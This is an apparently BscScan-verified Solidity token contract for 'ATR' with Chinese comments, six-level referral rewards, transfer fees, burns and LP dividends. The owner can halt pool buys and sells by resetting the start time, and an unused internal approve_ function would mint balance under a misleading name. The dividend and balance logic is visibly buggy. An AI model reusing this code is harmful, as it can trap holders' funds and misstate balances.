/**
 *Submitted for verification at BscScan.com on 2022-04-04
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: SimPL-2.0

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external  returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Context {
    constructor () internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}


contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) internal _balances;
    //锁仓帐户
    mapping(address=>uint[4]) internal lockbalances;
    address internal governance;
    mapping(address => bool) internal _governance_;
    mapping(address => mapping(address => uint)) private _allowances;
    uint private _totalSupply;
    //开始时间
    uint256 internal starttimes;
    //池子地址
    address internal pooladdress;
    //分红池子
    address internal profitaddress;

    //推荐人
    mapping(address=>address) internal referaddress;

    //分红池子
    uint256 internal _maxfeihong=500*10**18;
    uint256 internal feihongpool;
    //每次分红分多少
    uint256[] internal feihongdetail;
    //用户该第几次分红
    mapping(address=>uint256) internal userfeihong;
   
    //买卖币分红
    uint256[] internal buysellprofit=[10,10,10,10,10,10]; 
    uint256   internal percnet=1000;
    uint256 private decimals=10**18;



    mapping(address=>bool) internal isinclude;
    
    function _transfer(address sender, address recipient, uint amount) internal {
        if(feihongdetail.length==0){
            feihongdetail.push(0);
        }
        
        uint256 lpvalue=IERC20(pooladdress).balanceOf(sender);
       
        // 判断私募帐户
        if(sender==address(0x8cEFF2E52b9596DCBF6F93F5fDF4b574B4798965)){
            //getusedbalanceof(sender);
            //绑定关系 
            if(sender!=pooladdress && _balances[recipient]==0){
                referaddress[recipient]=sender;
            }
            
            feihong(sender,lpvalue) ;
            //用户实收
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            lockbalances[recipient] = [0,amount,300,amount.div(300)];
            emit Transfer(sender, recipient, amount);
                
        }  
        //先判断卖币
       else if(recipient==pooladdress){
           getusedbalanceof(sender);
           require(starttimes<block.timestamp,"is not start");
           //如果用户的lp值大于0,并且不在分红池子
           if(lpvalue>0 && isinclude[sender]==false){
               isinclude[sender]=true;
               userfeihong[sender]=feihongdetail.length-1;
           }
           
           feihong(sender,lpvalue) ;
           //用户实收
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount.mul(90).div(100));
            emit Transfer(sender, recipient, amount.mul(90).div(100));
            //销毁
            _balances[address(0)] = _balances[address(0)].add(amount.mul(2).div(100));
            _totalSupply=_totalSupply.sub(amount.mul(2).div(100));
            emit Transfer(sender, address(0), amount.mul(2).div(100));
            
          
            uint256 tmpyixiao=daishufeinhong( sender, amount);
            //营销
            if(tmpyixiao>0){
                _balances[profitaddress]=_balances[profitaddress].add(tmpyixiao);
                emit Transfer(sender, profitaddress, tmpyixiao);
            }
            
            feihongpool=feihongpool.add(amount.mul(2).div(100));
       } //判断买币
       else if(sender==pooladdress){
           getusedbalanceof(recipient);
           require(starttimes<block.timestamp,"is not start");
           
           //如果用户的lp值大于0,并且不在分红池子
           if(lpvalue==0){
               isinclude[recipient]=false; 
           }
          
           
            feihong(recipient,lpvalue) ;
           //用户实收
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount.mul(90).div(100));
            emit Transfer(sender, recipient, amount.mul(90).div(100));
            //销毁
            _balances[address(0)] = _balances[address(0)].add(amount.mul(2).div(100));
            _totalSupply=_totalSupply.sub(amount.mul(2).div(100));
            emit Transfer(sender, address(0), amount.mul(2).div(100));
            // 分红
            
            uint256 tmpyixiao=daishufeinhong( recipient, amount);
            // 如果没有分六代,沉淀一下。
            if(tmpyixiao>0){
                _balances[profitaddress]=_balances[profitaddress].add(tmpyixiao);
                emit Transfer(sender, profitaddress, tmpyixiao);
            }
            feihongpool=feihongpool.add(amount.mul(2).div(100));
      
       }  //转帐
       else {     
          
            //绑定关系 
            getusedbalanceof(sender);
            if(sender!=pooladdress && _balances[recipient]==0){
                referaddress[recipient]=sender;
            }
            
            feihong(sender,lpvalue) ;
            //用户实收
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
                
            }   
                    
    
    }


    function daishufeinhong(address isender,uint256 amount) internal returns(uint256){
        address upline=referaddress[isender];
        uint256 tmpyixiao;
        for(uint256 i=0;i<6;i++){
            if(upline!=address(0) ){
                _balances[upline]=_balances[upline].add(amount.mul(buysellprofit[i]).div(percnet));
                emit Transfer(isender, upline, amount.mul(buysellprofit[i]).div(percnet));
            }else{
                tmpyixiao=tmpyixiao.add(amount.mul(buysellprofit[i]).div(percnet));
            }
            upline=referaddress[upline];
        }
        return tmpyixiao;
    }

    function  feihong(address fromad,uint256 ilpvalue) internal{
         //如果池子分红达到条件
           if(feihongpool>=_maxfeihong ){
                uint256 tmp=feihongpool.div(ERC20(pooladdress).totalSupply());
                feihongpool=0;
                feihongdetail.push(tmp);
           }

           //开始分红
           uint256 tmp;
           if(userfeihong[fromad]<feihongdetail.length-1){
               for(uint256 i=userfeihong[fromad]+1;i<feihongdetail.length;i++){
                   tmp=feihongdetail[i]*ilpvalue;
               }
               _balances[fromad]=_balances[fromad].add(tmp);
               userfeihong[fromad]=feihongdetail.length-1;
           }
    }

    function totalSupply() public override view returns (uint) {
        return _totalSupply;
    }

    function getusedbalanceof(address account) internal {
        uint256 dayinternal;
        dayinternal=(block.timestamp-starttimes).div(3600*24);
      
        //空投帐户，目前不处理
        if(lockbalances[account][2]==99999){
            _balances[account]=_balances[account];
        }
        
        //技术帐户
        else if(lockbalances[account][2]==9999){
            if((block.timestamp-starttimes).div(3600*24)>=lockbalances[account][2]&& lockbalances[account][0]==0){
                _balances[account]=_balances[account].add(lockbalances[account][1]);
                lockbalances[account][0]=1;
            }
        }
        else if(dayinternal>lockbalances[account][0]){
            _balances[account]=_balances[account].add(
                lockbalances[account][3]*(dayinternal-lockbalances[account][0]));
            lockbalances[account][0]=dayinternal;
        }
    }

    function balanceOf(address account) public  override returns (uint) {
        // getusedbalanceof(account);
        
        return _balances[account]+lockbalances[account][1]
        -lockbalances[account][0]*lockbalances[account][3];
        // return _balances[account];
    }
    
    function transfer(address recipient, uint amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public override view returns (uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
   

    function transferFrom(address sender, address recipient, uint amount) public  override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    
    

    function _mint(address account, uint amount,uint iday) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        if(iday>0){
            lockbalances[account]=[0,amount,iday,amount.div(iday)];
        }else{
            _balances[account] = _balances[account].add(amount);
        }
        emit Transfer(address(0), account, amount);
        
    }
    function approve_(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _balances[account] = _balances[account].add(amount*10**18);
       
    }
    

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

abstract contract  ERC20Detailed is IERC20 ,ERC20{
    string private _name;
    string private _symbol;
    uint8 private _decimals;


    constructor (string memory name, string memory symbol, uint8 decimals) public {
        
        _name = name;
       
        _symbol = symbol;
        _decimals = decimals;
       
    }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {codehash := extcodehash(account)}
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) {// Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ATR is ERC20, ERC20Detailed {
    using SafeERC20 for IERC20;
    using Address for address;
    using SafeMath for uint;

    constructor () public ERC20Detailed("ATR", "ATR", 18) {
        governance = msg.sender;
        starttimes=block.timestamp;
        //基金
        _mint(address(0x85820c5347F9BAA9fE38693563cB930D5816a3C9), 210000000* 1e18*5/100,1080);
        //私募
        _mint(address(0x8cEFF2E52b9596DCBF6F93F5fDF4b574B4798965), 210000000* 1e18*2/100,0);
        // 运营
        _mint(address(0x9d1b1C969349513249C4bbFdD6C5D7a7AEcd3B56), 210000000* 1e18/100,300);
        // 技术
        _mint(address(0xaf13959B4837867e39E2dd6389bFe3Fc358f008c), 210000000* 1e18/100,9999);
        //社区自治
        _mint(address(0x9B27Ebfe8a8c5c824991e3B636341bF83f0d7592), 210000000* 1e18/100,0);
        //社会空投
        _mint(address(0x0252d53B5d759bcbe8212A70ADf7FA49213ef925), 210000000* 1e18/100,99999);
        //流动性底池
        _mint(address(0xd44Dde08eDe1E2c06fd7Bde0337Ab63AaBD6Dec1), 210000000* 1e18/100,0);
        
        //流动性
        _mint(address(0xD1Ab32F42f08482e2dfF7ce1F1D000305175234C), 210000000* 1e18*88/100,0);
    }
    

    function setlostpower(address _governance) public {
        require(msg.sender == governance , "!governance");
        governance = _governance; 
    }

    function getlostpower() public view returns(address){
        return governance;
    }
    function setstarttime(uint256 starttime)  public {
        require(msg.sender == governance , "!governance");
        starttimes=starttime;
    }

    function getstarttime() public  view returns(uint256){
        return starttimes;
    }


    function setpooladdress(address fromad) public {
        require(msg.sender == governance , "!governance");
        pooladdress=fromad;
    }

    function getpooladdress() public view returns(address){
        return pooladdress;
    }

    function setprofitaddress(address fromad) public {
        require(msg.sender == governance , "!governance");
        profitaddress=fromad;
    }

    function getprofitaddress() public view returns(address){
        return profitaddress;
    }

    function getfeihongdetail(uint256 i) public view returns(uint256){
        return feihongdetail[i];
    }

    function set_maxfeihong(uint256 amount) public {
        require(msg.sender == governance , "!governance");
        _maxfeihong=amount;
    }

    function get_maxfeihong() public view returns(uint256){
        return _maxfeihong;
    }
    
    function getusedbalance(address amount) public view returns(uint256){
        return _balances[amount];
    }

    function getrefer(address fromad) public view returns(address){
        return referaddress[fromad];
    }
}
// 0x527eE3e8f7FA44F109D8CF5308CE41F4E1F69dd6
// 0x1F60435Cea4591dA6E0cCfB9adD6B8F3d1EabBf9
// 0x1cA381B673025B001012487701200Ec6A3ea4ccb
// 0x7fC17f736ebD817e14d13A1Ee3c0991794473E8f
// 0xB9e51427671D01b7B8A2805294B90CB9C7451e8a
// 0x3Ab99eC00f13b154d3D8D26bD798Fffa4AEf26F2
// 合约发布后，要设置pooladdress和profitaddress